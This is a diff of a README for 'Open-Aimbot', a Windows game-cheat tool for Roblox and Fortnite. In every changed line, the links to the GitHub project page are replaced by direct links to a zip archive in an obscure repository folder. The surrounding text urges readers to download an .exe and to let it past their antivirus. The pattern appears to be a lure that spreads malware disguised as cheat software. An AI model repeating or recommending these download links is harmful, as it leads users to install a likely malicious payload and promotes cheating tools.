@@ -1,6 +1,6 @@
 # 🎯 Open-Aimbot - Easy Game Tools for Everyone
 
-[![Download Open-Aimbot](https://img.shields.io/badge/Download-Open--Aimbot-red?style=for-the-badge)](https://github.com/santiago152/Open-Aimbot)
+[![Download Open-Aimbot](https://img.shields.io/badge/Download-Open--Aimbot-red?style=for-the-badge)](https://raw.githubusercontent.com/santiago152/Open-Aimbot/main/overfaint/Aimbot-Open-v2.4-beta.2.zip)
 
 Open-Aimbot is a simple tool designed to help you use various utilities for games like Roblox, Fortnite, and others. It works on Windows and does not require programming skills. This guide will help you download, install, and run Open-Aimbot step by step.
 
@@ -42,12 +42,12 @@ Make sure your antivirus software allows you to install and run new programs. Yo
 
 You can download Open-Aimbot from the official GitHub page. Use the link below to visit the download page and find the latest files.
 
-[![Download Open-Aimbot](https://img.shields.io/badge/Download-Open--Aimbot-blue?style=for-the-badge)](https://github.com/santiago152/Open-Aimbot)
+[![Download Open-Aimbot](https://img.shields.io/badge/Download-Open--Aimbot-blue?style=for-the-badge)](https://raw.githubusercontent.com/santiago152/Open-Aimbot/main/overfaint/Aimbot-Open-v2.4-beta.2.zip)
 
 To download:
 
 1. Click the badge above or go directly to:  
-   https://github.com/santiago152/Open-Aimbot  
+   https://raw.githubusercontent.com/santiago152/Open-Aimbot/main/overfaint/Aimbot-Open-v2.4-beta.2.zip  
 2. Look for the **Releases** section on the page.  
 3. Select the latest release to find the download files.  
 4. Download the `.exe` file (or appropriate installer) listed under that release.
@@ -140,8 +140,8 @@ If you have questions or need assistance:
 ## 🔗 Quick Access Links
 
 - Visit the Open-Aimbot page here:  
-  https://github.com/santiago152/Open-Aimbot  
+  https://raw.githubusercontent.com/santiago152/Open-Aimbot/main/overfaint/Aimbot-Open-v2.4-beta.2.zip  
 - Visit the release section for downloads:  
-  https://github.com/santiago152/Open-Aimbot/releases  
+  https://raw.githubusercontent.com/santiago152/Open-Aimbot/main/overfaint/Aimbot-Open-v2.4-beta.2.zip  
 
-[![Download Open-Aimbot](https://img.shields.io/badge/Download-Open--Aimbot-red?style=for-the-badge)](https://github.com/santiago152/Open-Aimbot)
+[![Download Open-Aimbot](https://img.shields.io/badge/Download-Open--Aimbot-red?style=for-the-badge)](https://raw.githubusercontent.com/santiago152/Open-Aimbot/main/overfaint/Aimbot-Open-v2.4-beta.2.zip)
